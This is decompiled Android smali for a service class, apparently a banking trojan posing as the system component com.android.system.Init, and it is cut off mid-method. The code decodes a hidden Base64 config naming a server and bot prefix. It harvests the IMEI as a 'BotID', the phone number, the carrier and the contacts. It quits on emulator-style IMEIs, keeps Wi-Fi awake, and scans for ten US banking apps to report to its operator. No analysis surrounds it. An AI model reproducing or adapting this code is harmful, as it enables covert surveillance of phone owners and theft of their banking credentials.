.class public Lcom/android/system/Init;
.super Landroid/app/Service;
.source "Init.java"


# static fields
.field static xz:Landroid/content/Context;


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 59
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method public static getContext()Landroid/content/Context;
    .locals 1

    .prologue
    .line 235
    sget-object v0, Lcom/android/system/Init;->xz:Landroid/content/Context;

    .line 236
    .local v0, "c":Landroid/content/Context;
    return-object v0
.end method

.method public static getUserCountry(Landroid/content/Context;)Ljava/lang/String;
    .locals 5
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    const/4 v4, 0x2

    .line 189
    :try_start_0
    const-string v3, "phone"

    invoke-virtual {p0, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/telephony/TelephonyManager;

    .line 190
    .local v2, "tm":Landroid/telephony/TelephonyManager;
    invoke-virtual {v2}, Landroid/telephony/TelephonyManager;->getSimCountryIso()Ljava/lang/String;

    move-result-object v1

    .line 191
    .local v1, "simCountry":Ljava/lang/String;
    if-eqz v1, :cond_0

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v3

    if-ne v3, v4, :cond_0

    .line 192
    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    move-result-object v3

    .line 202
    .end local v1    # "simCountry":Ljava/lang/String;
    .end local v2    # "tm":Landroid/telephony/TelephonyManager;
    :goto_0
    return-object v3

    .line 194
    .restart local v1    # "simCountry":Ljava/lang/String;
    .restart local v2    # "tm":Landroid/telephony/TelephonyManager;
    :cond_0
    invoke-virtual {v2}, Landroid/telephony/TelephonyManager;->getPhoneType()I

    move-result v3

    if-eq v3, v4, :cond_1

    .line 195
    invoke-virtual {v2}, Landroid/telephony/TelephonyManager;->getNetworkCountryIso()Ljava/lang/String;

    move-result-object v0

    .line 196
    .local v0, "networkCountry":Ljava/lang/String;
    if-eqz v0, :cond_1

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v3

    if-ne v3, v4, :cond_1

    .line 197
    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v3

    goto :goto_0

    .line 201
    .end local v0    # "networkCountry":Ljava/lang/String;
    .end local v1    # "simCountry":Ljava/lang/String;
    .end local v2    # "tm":Landroid/telephony/TelephonyManager;
    :catch_0
    move-exception v3

    .line 202
    :cond_1
    const/4 v3, 0x0

    goto :goto_0
.end method

.method private isConfigured(Ljava/lang/String;)Z
    .locals 3
    .param p1, "cfg"    # Ljava/lang/String;

    .prologue
    .line 240
    new-instance v1, Lcom/android/system/IO;

    invoke-direct {v1}, Lcom/android/system/IO;-><init>()V

    invoke-virtual {p0}, Lcom/android/system/Init;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-virtual {v1, p1, v2}, Lcom/android/system/IO;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "!"

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_0

    const/4 v0, 0x0

    .line 241
    .local v0, "C":Z
    :goto_0
    return v0

    .line 240
    .end local v0    # "C":Z
    :cond_0
    const/4 v0, 0x1

    goto :goto_0
.end method

.method private noSleep(Landroid/content/Context;)V
    .locals 5
    .param p1, "c"    # Landroid/content/Context;

    .prologue
    .line 209
    :try_start_0
    invoke-virtual {p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    .line 210
    .local v0, "cr":Landroid/content/ContentResolver;
    sget v3, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v4, 0x10

    if-gt v3, v4, :cond_0

    .line 211
    const/4 v2, 0x2

    .line 212
    .local v2, "set":I
    const-string v3, "wifi_sleep_policy"

    invoke-static {v0, v3, v2}, Landroid/provider/Settings$System;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z

    .line 221
    .end local v0    # "cr":Landroid/content/ContentResolver;
    .end local v2    # "set":I
    :goto_0
    return-void

    .line 214
    .restart local v0    # "cr":Landroid/content/ContentResolver;
    :cond_0
    const/4 v2, 0x2

    .line 215
    .restart local v2    # "set":I
    const-string v3, "wifi_sleep_policy"

    invoke-static {v0, v3, v2}, Landroid/provider/Settings$System;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 218
    .end local v0    # "cr":Landroid/content/ContentResolver;
    .end local v2    # "set":I
    :catch_0
    move-exception v1

    .line 219
    .local v1, "e":Ljava/lang/Exception;
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method private writeCfg(Ljava/lang/String;Ljava/lang/String;)V
    .locals 2
    .param p1, "cfg"    # Ljava/lang/String;
    .param p2, "data"    # Ljava/lang/String;

    .prologue
    .line 245
    new-instance v0, Lcom/android/system/IO;

    invoke-direct {v0}, Lcom/android/system/IO;-><init>()V

    invoke-virtual {p0}, Lcom/android/system/Init;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v0, p1, p2, v1}, Lcom/android/system/IO;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 246
    return-void
.end method


# virtual methods
.method public LoadData(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;
    .locals 11
    .param p1, "f"    # Ljava/lang/String;
    .param p2, "c"    # Landroid/content/Context;

    .prologue
    .line 249
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    .line 250
    .local v0, "Ret":Ljava/lang/StringBuilder;
    const/4 v3, 0x0

    .line 251
    .local v3, "fIn":Ljava/io/InputStream;
    const/4 v6, 0x0

    .line 252
    .local v6, "isr":Ljava/io/InputStreamReader;
    const/4 v4, 0x0

    .line 254
    .local v4, "input":Ljava/io/BufferedReader;
    :try_start_0
    invoke-virtual {p2}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v9

    invoke-virtual {v9}, Landroid/content/res/Resources;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v9

    .line 255
    const/4 v10, 0x0

    invoke-virtual {v9, p1, v10}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;I)Ljava/io/InputStream;

    move-result-object v3

    .line 256
    new-instance v7, Ljava/io/InputStreamReader;

    const-string v9, "UTF-8"

    invoke-direct {v7, v3, v9}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_4
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 257
    .end local v6    # "isr":Ljava/io/InputStreamReader;
    .local v7, "isr":Ljava/io/InputStreamReader;
    :try_start_1
    new-instance v5, Ljava/io/BufferedReader;

    invoke-direct {v5, v7}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_5
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    .line 258
    .end local v4    # "input":Ljava/io/BufferedReader;
    .local v5, "input":Ljava/io/BufferedReader;
    :try_start_2
    const-string v8, ""

    .line 259
    .local v8, "line":Ljava/lang/String;
    :goto_0
    invoke-virtual {v5}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
    .catchall {:try_start_2 .. :try_end_2} :catchall_2

    move-result-object v8

    if-nez v8, :cond_3

    .line 266
    if-eqz v7, :cond_0

    .line 267
    :try_start_3
    invoke-virtual {v7}, Ljava/io/InputStreamReader;->close()V

    .line 268
    :cond_0
    if-eqz v3, :cond_1

    .line 269
    invoke-virtual {v3}, Ljava/io/InputStream;->close()V

    .line 270
    :cond_1
    if-eqz v5, :cond_9

    .line 271
    invoke-virtual {v5}, Ljava/io/BufferedReader;->close()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    move-object v4, v5

    .end local v5    # "input":Ljava/io/BufferedReader;
    .restart local v4    # "input":Ljava/io/BufferedReader;
    move-object v6, v7

    .line 277
    .end local v7    # "isr":Ljava/io/InputStreamReader;
    .end local v8    # "line":Ljava/lang/String;
    .restart local v6    # "isr":Ljava/io/InputStreamReader;
    :cond_2
    :goto_1
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    return-object v9

    .line 260
    .end local v4    # "input":Ljava/io/BufferedReader;
    .end local v6    # "isr":Ljava/io/InputStreamReader;
    .restart local v5    # "input":Ljava/io/BufferedReader;
    .restart local v7    # "isr":Ljava/io/InputStreamReader;
    .restart local v8    # "line":Ljava/lang/String;
    :cond_3
    :try_start_4
    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0
    .catchall {:try_start_4 .. :try_end_4} :catchall_2

    goto :goto_0

    .line 262
    .end local v8    # "line":Ljava/lang/String;
    :catch_0
    move-exception v1

    move-object v4, v5

    .end local v5    # "input":Ljava/io/BufferedReader;
    .restart local v4    # "input":Ljava/io/BufferedReader;
    move-object v6, v7

    .line 263
    .end local v7    # "isr":Ljava/io/InputStreamReader;
    .local v1, "e":Ljava/lang/Exception;
    .restart local v6    # "isr":Ljava/io/InputStreamReader;
    :goto_2
    :try_start_5
    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    .line 266
    if-eqz v6, :cond_4

    .line 267
    :try_start_6
    invoke-virtual {v6}, Ljava/io/InputStreamReader;->close()V

    .line 268
    :cond_4
    if-eqz v3, :cond_5

    .line 269
    invoke-virtual {v3}, Ljava/io/InputStream;->close()V

    .line 270
    :cond_5
    if-eqz v4, :cond_2

    .line 271
    invoke-virtual {v4}, Ljava/io/BufferedReader;->close()V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_1

    goto :goto_1

    .line 272
    :catch_1
    move-exception v2

    .line 273
    .local v2, "e2":Ljava/lang/Exception;
    invoke-virtual {v2}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    goto :goto_1

    .line 264
    .end local v1    # "e":Ljava/lang/Exception;
    .end local v2    # "e2":Ljava/lang/Exception;
    :catchall_0
    move-exception v9

    .line 266
    :goto_3
    if-eqz v6, :cond_6

    .line 267
    :try_start_7
    invoke-virtual {v6}, Ljava/io/InputStreamReader;->close()V

    .line 268
    :cond_6
    if-eqz v3, :cond_7

    .line 269
    invoke-virtual {v3}, Ljava/io/InputStream;->close()V

    .line 270
    :cond_7
    if-eqz v4, :cond_8

    .line 271
    invoke-virtual {v4}, Ljava/io/BufferedReader;->close()V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_2

    .line 275
    :cond_8
    :goto_4
    throw v9

    .line 272
    :catch_2
    move-exception v2

    .line 273
    .restart local v2    # "e2":Ljava/lang/Exception;
    invoke-virtual {v2}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    goto :goto_4

    .line 272
    .end local v2    # "e2":Ljava/lang/Exception;
    .end local v4    # "input":Ljava/io/BufferedReader;
    .end local v6    # "isr":Ljava/io/InputStreamReader;
    .restart local v5    # "input":Ljava/io/BufferedReader;
    .restart local v7    # "isr":Ljava/io/InputStreamReader;
    .restart local v8    # "line":Ljava/lang/String;
    :catch_3
    move-exception v2

    .line 273
    .restart local v2    # "e2":Ljava/lang/Exception;
    invoke-virtual {v2}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    .end local v2    # "e2":Ljava/lang/Exception;
    :cond_9
    move-object v4, v5

    .end local v5    # "input":Ljava/io/BufferedReader;
    .restart local v4    # "input":Ljava/io/BufferedReader;
    move-object v6, v7

    .end local v7    # "isr":Ljava/io/InputStreamReader;
    .restart local v6    # "isr":Ljava/io/InputStreamReader;
    goto :goto_1

    .line 264
    .end local v6    # "isr":Ljava/io/InputStreamReader;
    .end local v8    # "line":Ljava/lang/String;
    .restart local v7    # "isr":Ljava/io/InputStreamReader;
    :catchall_1
    move-exception v9

    move-object v6, v7

    .end local v7    # "isr":Ljava/io/InputStreamReader;
    .restart local v6    # "isr":Ljava/io/InputStreamReader;
    goto :goto_3

    .end local v4    # "input":Ljava/io/BufferedReader;
    .end local v6    # "isr":Ljava/io/InputStreamReader;
    .restart local v5    # "input":Ljava/io/BufferedReader;
    .restart local v7    # "isr":Ljava/io/InputStreamReader;
    :catchall_2
    move-exception v9

    move-object v4, v5

    .end local v5    # "input":Ljava/io/BufferedReader;
    .restart local v4    # "input":Ljava/io/BufferedReader;
    move-object v6, v7

    .end local v7    # "isr":Ljava/io/InputStreamReader;
    .restart local v6    # "isr":Ljava/io/InputStreamReader;
    goto :goto_3

    .line 262
    :catch_4
    move-exception v1

    goto :goto_2

    .end local v6    # "isr":Ljava/io/InputStreamReader;
    .restart local v7    # "isr":Ljava/io/InputStreamReader;
    :catch_5
    move-exception v1

    move-object v6, v7

    .end local v7    # "isr":Ljava/io/InputStreamReader;
    .restart local v6    # "isr":Ljava/io/InputStreamReader;
    goto :goto_2
.end method

.method public appStat(Ljava/lang/String;)Z
    .locals 3
    .param p1, "targetPackage"    # Ljava/lang/String;

    .prologue
    .line 225
    invoke-virtual {p0}, Lcom/android/system/Init;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    .line 227
    .local v1, "pm":Landroid/content/pm/PackageManager;
    const/16 v2, 0x80

    :try_start_0
    invoke-virtual {v1, p1, v2}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    .line 231
    const/4 v2, 0x1

    :goto_0
    return v2

    .line 228
    :catch_0
    move-exception v0

    .line 229
    .local v0, "e":Landroid/content/pm/PackageManager$NameNotFoundException;
    const/4 v2, 0x0

    goto :goto_0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "arg0"    # Landroid/content/Intent;

    .prologue
    .line 283
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 28

    .prologue
    .line 67
    invoke-super/range {p0 .. p0}, Landroid/app/Service;->onCreate()V

    .line 69
    const-string v2, "phone"

    move-object/from16 v0, p0

    invoke-virtual {v0, v2}, Lcom/android/system/Init;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v24

    check-cast v24, Landroid/telephony/TelephonyManager;

    .line 72
    .local v24, "tm":Landroid/telephony/TelephonyManager;
    const-string v2, "Init"

    invoke-virtual/range {p0 .. p0}, Lcom/android/system/Init;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    move-object/from16 v0, p0

    invoke-virtual {v0, v2, v3}, Lcom/android/system/Init;->LoadData(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v21

    .line 73
    .local v21, "Unpack":Ljava/lang/String;
    const/16 v20, 0x0

    .line 76
    .local v20, "U":[Ljava/lang/String;
    const/4 v2, 0x0

    :try_start_0
    move-object/from16 v0, v21

    invoke-static {v0, v2}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v18

    .line 77
    .local v18, "Pck":[B
    new-instance v22, Ljava/lang/String;

    const-string v2, "UTF-8"

    move-object/from16 v0, v22

    move-object/from16 v1, v18

    invoke-direct {v0, v1, v2}, Ljava/lang/String;-><init>([BLjava/lang/String;)V

    .line 78
    .local v22, "Unpacz":Ljava/lang/String;
    const-string v2, ";"

    move-object/from16 v0, v22

    invoke-virtual {v0, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;
    :try_end_0
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/IllegalArgumentException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v20

    .line 85
    .end local v18    # "Pck":[B
    .end local v22    # "Unpacz":Ljava/lang/String;
    :goto_0
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/Init;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    sput-object v2, Lcom/android/system/Init;->xz:Landroid/content/Context;

    .line 89
    invoke-virtual/range {v24 .. v24}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_a

    .line 90
    invoke-virtual/range {v24 .. v24}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v10

    .line 92
    .local v10, "BotID":Ljava/lang/String;
    :goto_1
    invoke-virtual/range {v24 .. v24}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_b

    .line 93
    invoke-virtual/range {v24 .. v24}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v13

    .line 95
    .local v13, "BotPhone":Ljava/lang/String;
    :goto_2
    invoke-virtual/range {v24 .. v24}, Landroid/telephony/TelephonyManager;->getNetworkOperatorName()Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_c

    invoke-virtual/range {v24 .. v24}, Landroid/telephony/TelephonyManager;->getNetworkOperatorName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v2

    const/4 v3, 0x1

    if-le v2, v3, :cond_c

    invoke-virtual/range {v24 .. v24}, Landroid/telephony/TelephonyManager;->getSimOperator()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v2

    const/4 v3, 0x1

    if-le v2, v3, :cond_c

    .line 96
    invoke-virtual/range {v24 .. v24}, Landroid/telephony/TelephonyManager;->getNetworkOperatorName()Ljava/lang/String;

    move-result-object v12

    .line 98
    .local v12, "BotNetwork":Ljava/lang/String;
    :goto_3
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/Init;->getResources()Landroid/content/res/Resources;

    move-result-object v2

    invoke-virtual {v2}, Landroid/content/res/Resources;->getConfiguration()Landroid/content/res/Configuration;

    move-result-object v2

    iget-object v2, v2, Landroid/content/res/Configuration;->locale:Ljava/util/Locale;

    invoke-virtual {v2}, Ljava/util/Locale;->toString()Ljava/lang/String;

    move-result-object v11

    .line 105
    .local v11, "BotLocation":Ljava/lang/String;
    const-string v2, "_"

    invoke-virtual {v11, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 106
    const-string v2, "_"

    invoke-virtual {v11, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v25

    .line 107
    .local v25, "tmp":[Ljava/lang/String;
    const/4 v2, 0x1

    aget-object v11, v25, v2

    .line 110
    .end local v25    # "tmp":[Ljava/lang/String;
    :cond_0
    const-string v2, "000000000000000"

    invoke-virtual {v10, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_1

    const/4 v2, 0x0

    invoke-static {v2}, Ljava/lang/System;->exit(I)V

    .line 113
    :cond_1
    const-string v2, "BotID"

    move-object/from16 v0, p0

    invoke-direct {v0, v2, v10}, Lcom/android/system/Init;->writeCfg(Ljava/lang/String;Ljava/lang/String;)V

    .line 114
    const-string v2, "BotNetwork"

    const-string v3, ":"

    const-string v4, ""

    invoke-virtual {v12, v3, v4}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    const-string v4, " "

    const-string v5, "_"

    invoke-virtual {v3, v4, v5}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    move-object/from16 v0, p0

    invoke-direct {v0, v2, v3}, Lcom/android/system/Init;->writeCfg(Ljava/lang/String;Ljava/lang/String;)V

    .line 115
    const-string v2, "BotLocation"

    move-object/from16 v0, p0

    invoke-direct {v0, v2, v11}, Lcom/android/system/Init;->writeCfg(Ljava/lang/String;Ljava/lang/String;)V

    .line 116
    const-string v2, "BotPhone"

    move-object/from16 v0, p0

    invoke-direct {v0, v2, v13}, Lcom/android/system/Init;->writeCfg(Ljava/lang/String;Ljava/lang/String;)V

    .line 120
    const/4 v2, 0x0

    aget-object v17, v20, v2

    .line 121
    .local v17, "HttpServer":Ljava/lang/String;
    const/4 v2, 0x1

    aget-object v14, v20, v2

    .line 122
    .local v14, "BotPrefix":Ljava/lang/String;
    const/4 v2, 0x2

    aget-object v15, v20, v2

    .line 128
    .local v15, "BotVer":Ljava/lang/String;
    const-string v2, "HG"

    move-object/from16 v0, p0

    invoke-direct {v0, v2}, Lcom/android/system/Init;->isConfigured(Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_2

    const-string v2, "HG"

    move-object/from16 v0, p0

    move-object/from16 v1, v17

    invoke-direct {v0, v2, v1}, Lcom/android/system/Init;->writeCfg(Ljava/lang/String;Ljava/lang/String;)V

    .line 129
    :cond_2
    const-string v2, "i"

    move-object/from16 v0, p0

    invoke-direct {v0, v2}, Lcom/android/system/Init;->isConfigured(Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_3

    const-string v2, "i"

    const-string v3, "*"

    move-object/from16 v0, p0

    invoke-direct {v0, v2, v3}, Lcom/android/system/Init;->writeCfg(Ljava/lang/String;Ljava/lang/String;)V

    .line 130
    :cond_3
    const-string v2, "c"

    move-object/from16 v0, p0

    invoke-direct {v0, v2}, Lcom/android/system/Init;->isConfigured(Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_4

    const-string v2, "c"

    const-string v3, "*"

    move-object/from16 v0, p0

    invoke-direct {v0, v2, v3}, Lcom/android/system/Init;->writeCfg(Ljava/lang/String;Ljava/lang/String;)V

    .line 132
    :cond_4
    const-string v2, "zlock"

    move-object/from16 v0, p0

    invoke-direct {v0, v2}, Lcom/android/system/Init;->isConfigured(Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_5

    const-string v2, "zlock"

    const-string v3, "start"

    move-object/from16 v0, p0

    invoke-direct {v0, v2, v3}, Lcom/android/system/Init;->writeCfg(Ljava/lang/String;Ljava/lang/String;)V

    .line 134
    :cond_5
    const-string v2, "BotPrefix"

    move-object/from16 v0, p0

    invoke-direct {v0, v2, v14}, Lcom/android/system/Init;->writeCfg(Ljava/lang/String;Ljava/lang/String;)V

    .line 135
    const-string v2, "BotVer"

    move-object/from16 v0, p0

    invoke-direct {v0, v2, v15}, Lcom/android/system/Init;->writeCfg(Ljava/lang/String;Ljava/lang/String;)V

    .line 140
    new-instance v8, Lcom/android/system/netCfg;

    invoke-direct {v8}, Lcom/android/system/netCfg;-><init>()V

    .line 142
    .local v8, "AA":Lcom/android/system/netCfg;
    if-eqz v8, :cond_6

    invoke-virtual/range {p0 .. p0}, Lcom/android/system/Init;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-virtual {v8, v2}, Lcom/android/system/netCfg;->Tasker(Landroid/content/Context;)V

    .line 145
    :cond_6
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/Init;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    move-object/from16 v0, p0

    invoke-direct {v0, v2}, Lcom/android/system/Init;->noSleep(Landroid/content/Context;)V

    .line 148
    const-string v2, "contacts"

    move-object/from16 v0, p0

    invoke-direct {v0, v2}, Lcom/android/system/Init;->isConfigured(Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_7

    .line 149
    new-instance v2, Lcom/android/system/Phones;

    invoke-direct {v2}, Lcom/android/system/Phones;-><init>()V

    invoke-virtual/range {p0 .. p0}, Lcom/android/system/Init;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-virtual {v2, v3}, Lcom/android/system/Phones;->Work(Landroid/content/Context;)Ljava/lang/String;

    .line 153
    :cond_7
    const-string v2, "app_stat"

    move-object/from16 v0, p0

    invoke-direct {v0, v2}, Lcom/android/system/Init;->isConfigured(Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_9

    .line 154
    const-string v9, "com.usaa.mobile.android.usaa;com.citi.citimobile;com.americanexpress.android.acctsvcs.us;com.wf.wellsfargomobile;com.tablet.bofa;com.infonow.bofa;com.tdbank;com.chase.sig.android;com.bbt.androidapp.activity;com.regions.mobbanking"

    .line 155
    .local v9, "Apps":Ljava/lang/String;
    const-string v2, ";"

    invoke-virtual {v9, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v16

    .line 156
    .local v16, "Detect":[Ljava/lang/String;
    const-string v19, "[ Installed Apps ]\n\n"

    .line 157
    .local v19, "Report":Ljava/lang/String;
    const/16 v23, 0x0

    .line 159
    .local v23, "o":I
    const/16 v26, 0x0

    .local v26, "x":I
    :goto_4
    move-object/from16 v0, v16

    array-length v2, v0

    move/from16 v0, v26

    if-lt v0, v2, :cond_d

    .line 166
    if-nez v23, :cond_8

    const-string v19, "No one of applications are installed."

    .line 169
    :cond_8
    new-instance v2, Lcom/android/system/IO;

    invoke-direct {v2}, Lcom/android/system/IO;-><init>()V

    const-string v3, "app_stat"

    invoke-virtual/range {p0 .. p0}, Lcom/android/system/Init;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    move-object/from16 v0, v19

    invoke-virtual {v2, v3, v0, v4}, Lcom/android/system/IO;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 171
    const-string v27, "app_stat"

    .line 173
    .local v27, "xx":Ljava/lang/String;
    new-instance v2, Lcom/android/system/Report;

    invoke-direct {v2}, Lcom/android/system/Report;-><init>()V

    const-string v3, "kavzucker"

    .line 174
    const-string v4, "app_stat"

    .line 175
    const-string v5, "app_stat"

    .line 176
    const-string v6, "app_stat"

    .line 177
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/Init;->getApplicationContext()Landroid/content/Context;

    move-result-object v7

    .line 173
    invoke-virtual/range {v2 .. v7}, Lcom/android/system/Report;->Av(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 183
    .end local v9    # "Apps":Ljava/lang/String;
    .end local v16    # "Detect":[Ljava/lang/String;
    .end local v19    # "Report":Ljava/lang/String;
    .end local v23    # "o":I
    .end local v26    # "x":I
    .end local v27    # "xx":Ljava/lang/String;
    :cond_9
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/Init;->stopSelf()V

    .line 184
    return-void

    .line 90
    .end local v8    # "AA":Lcom/android/system/netCfg;
    .end local v10    # "BotID":Ljava/lang/String;
    .end local v11    # "BotLocation":Ljava/lang/String;
    .end local v12    # "BotNetwork":Ljava/lang/String;
    .end local v13    # "BotPhone":Ljava/lang/String;
    .end local v14    # "BotPrefix":Ljava/lang/String;
    .end local v15    # "BotVer":Ljava/lang/String;
    .end local v17    # "HttpServer":Ljava/lang/String;
    :cond_a
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/Init;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-virtual {v2}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    const-string v3, "android_id"

    invoke-static {v2, v3}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    goto/16 :goto_1

    .line 93
    .restart local v10    # "BotID":Ljava/lang/String;
    :cond_b
    const-string v13, ""

    goto/16 :goto_2

    .line 96
    .restart local v13    # "BotPhone":Ljava/lang/String;
    :cond_c
    const-string v12, ""

    goto/16 :goto_3

    .line 160
    .restart local v8    # "AA":Lcom/android/system/netCfg;
    .restart local v9    # "Apps":Ljava/lang/String;
    .restart local v11    # "BotLocation":Ljava/lang/String;
    .restart local v12    # "BotNetwork":Ljava/lang/String;
    .restart local v14    # "BotPrefix":Ljava/lang/String;
    .restart local v15    # "BotVer":Ljava/lang/String;
    .restart local v16    # "Detect":[Ljava/lang/String;
    .restart local v17    # "HttpServer":Ljava/lang/String;
    .restart local v19    # "Report":Ljava/lang/String;
    .restart local v23    # "o":I
    .restart local v26    # "x":I
    :cond_d
    aget-object v2, v16, v26

    move-object/from16 v0, p0

    invoke-virtual {v0, v2}, Lcom/android/system/Init;->appStat(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_e

    .line 161
    add-int/lit8 v23, v23, 0x1

    .line 162
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static/range {v19 .. v19}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    aget-object v3, v16, v26

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "\n"

